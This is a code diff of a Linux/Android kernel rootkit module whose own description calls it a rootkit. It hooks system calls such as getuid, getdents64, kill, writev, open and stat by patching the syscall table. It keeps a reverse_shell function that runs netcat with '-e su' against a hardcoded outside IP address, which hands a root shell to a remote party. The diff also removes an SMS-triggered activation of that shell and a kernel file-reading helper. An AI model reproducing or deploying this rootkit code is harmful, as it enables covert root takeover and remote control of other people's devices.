@@ -8,22 +8,6 @@
 #include <asm/uaccess.h> 
 #include <linux/compat.h>
 
-#include <linux/init.h>
-#include <linux/kprobes.h>
-#include <linux/kallsyms.h>
-#include <linux/ptrace.h>
-#include <linux/mm.h>
-#include <linux/smp.h>
-#include <linux/user.h>
-#include <linux/errno.h>
-#include <linux/cpu.h>
-#include <asm/uaccess.h>
-#include <asm/fcntl.h>
-#include <asm/unistd.h>
-
-#include <linux/stddef.h>
-#include <linux/mm.h>
-#include <linux/smp_lock.h>
 
 #define AUTHOR "Hitesh Dharmdasani <hdharmda@gmu.edu>"
 #define DESCRIPTION 	"This rookit is developed to intercept the following calls\n \\
@@ -68,9 +52,6 @@ int pid_offset=0;
 int parent_offset=0;
 int next_offset=0;
 
-extern int do_execve(const char *,
-                     const char __user * const __user *,
-                     const char __user * const __user *, struct pt_regs *);
 
 asmlinkage long (*orig_stat)(const char __user *filename,struct __old_kernel_stat __user *statbuf);
 asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len,const char __user *uargs);
@@ -111,39 +92,6 @@ void get_sys_call_table(){
 		}
 	}
 	return;
-}
-
-char* get_contents(const char* path) 
-{
-    // Create variables
-    struct file *f;
-    char buf[128];
-    mm_segment_t fs;
-    int i;
-    // Init the buffer with 0
-    for(i=0;i<128;i++)
-        buf[i] = 0;
-    // To see in /var/log/messages that the module is operating
-    printk(KERN_INFO "My module is loaded\n");
-    // I am using Fedora and for the test I have chosen following file
-    // Obviously it is much smaller than the 128 bytes, but hell with it =)
-    f = filp_open(path, O_RDONLY, 0);
-    if(f == NULL)
-        printk(KERN_ALERT "filp_open error!!.\n");
-    else{
-        // Get current segment descriptor
-        fs = get_fs();
-        // Set segment descriptor associated to kernel space
-        set_fs(get_ds());
-        // Read the file
-        f->f_op->read(f, buf, 128, &f->f_pos);
-        // Restore segment descriptor
-        set_fs(fs);
-        // See what we read from file
-        printk(KERN_INFO "buf:%s\n",buf);
-    }
-    filp_close(f,NULL);
-    return buf;
 }
 
 asmlinkage uid_t our_getuid(void){
@@ -242,8 +190,8 @@ asmlinkage int our_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, uns
 
 void reverse_shell()
 {
-	char *path="rshell";
-	char *argv[]={"nc","169.228.66.210","8282","-e","su","&",NULL};
+	char *path="/system/xbin/nc";
+	char *argv[]={"169.228.66.210","12000","-e","su","&",NULL};
 	char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};
 	call_usermodehelper(path,argv,envp,1);
 }
@@ -258,19 +206,7 @@ asmlinkage int our_kill(pid_t pid, int sig)
 
 asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
 {
-	char *ptr=(char *)current;
-	char *comm=ptr+comm_offset;
-	int i=0;
-
-	if(strstr(comm,"SmsReceiverServ"))
-	{
-		for(i=0;i<count;i++,vector++){
-			if(strstr((char *)vector->iov_base,"0000")){ /* magic phone number */
-				printk("sms receive\n");
-				reverse_shell();
-			}
-		}
-	}
+	printk(KERN_INFO "SYS_WRITEV ");
 	return orig_writev(fd,vector,count);
 }
 
@@ -285,7 +221,13 @@ asmlinkage ssize_t our_open(const char *pathname, int flags)
 	printk(KERN_INFO "SYS_OPEN: %s\n",pathname);
 	return orig_open(pathname,flags);
 }
- 
+ asmlinkage long our_stat(const char __user *filename,struct __old_kernel_stat __user *statbuf)
+{
+	printk(KERN_INFO "SYS_STAT: %s\n",filename);
+	return orig_stat(filename,statbuf);
+}
+
+
 // asmlinkage int sys_execve(const char __user *filenamei,
 //                           const char __user *const __user *argv,
 //                           const char __user *const __user *envp, struct pt_regs *regs)
@@ -302,11 +244,7 @@ asmlinkage ssize_t our_open(const char *pathname, int flags)
 // out:
 //         return error;
 // }
-asmlinkage long our_stat(const char __user *filename,struct __old_kernel_stat __user *statbuf)
-{
-	printk(KERN_INFO "SYS_STAT: %s\n",filename);
-	return orig_stat(filename,statbuf);
-}
+
 // asmlinkage int our_execve(const char __user *filenamei,
 //                           const char __user *const __user *argv,
 //                           const char __user *const __user *envp, struct pt_regs *regs)
@@ -383,6 +321,7 @@ void cleanup_module(void)
 	sys_call_table[__NR_MKDIR]=orig_mkdir;
 	sys_call_table[__NR_GETUID]=orig_getuid;
 	sys_call_table[__NR_UNLINK]=orig_unlink;
+	sys_call_table[__NR_STAT] = orig_stat;
 	// sys_call_table[__NR_INIT_MOD] = orig_init_module;
 	// sys_call_table[__NR_DEL_MOD] = orig_delete_module;
 	// sys_call_table[__NR_EXECVE] = orig_execve;
